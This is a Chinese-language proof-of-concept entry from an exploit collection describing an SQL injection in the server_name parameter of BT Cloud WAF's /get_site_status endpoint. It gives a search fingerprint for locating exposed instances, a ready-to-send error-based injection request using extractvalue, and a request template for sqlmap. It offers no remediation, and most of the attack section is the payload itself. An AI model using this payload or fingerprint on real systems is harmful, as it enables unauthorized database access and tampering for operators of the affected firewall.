---
source: "wy876 漏洞文库"
---

# 宝塔云WAF server_name存在SQL注入漏洞

# 一、漏洞简介
免费的私有云WAF防火墙 堡塔云WAF经过千万级用户认证、为您的业务保驾护航 采用反向代理的方式,网站流量先抵达堡塔云WAF 经过堡塔云WAF检测和过滤后，再转给原来提供服务的网站服务器。堡塔云WAF是一个开源的Web应用程序防火墙，它可以保护网站免受SQL注入，XSS，CSRF，SSRF，命令注入，代码注入，本地文件包含，远程文件包含等攻击 兼容ARM和国产系统。堡塔云WAF server_name 接口处存在SQL注入漏洞,恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。

# 二、影响版本
+ 堡塔云WAF

# 三、资产测绘
```plain
title=="404 - Website not exist!"
```


# 四、漏洞复现
```plain
GET /get_site_status?server_name='-extractvalue(1,concat(0x5c,123456789))-'1 HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


sqlmap:

```plain
GET /get_site_status?server_name=1 HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ck7t8ensptmf97se>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
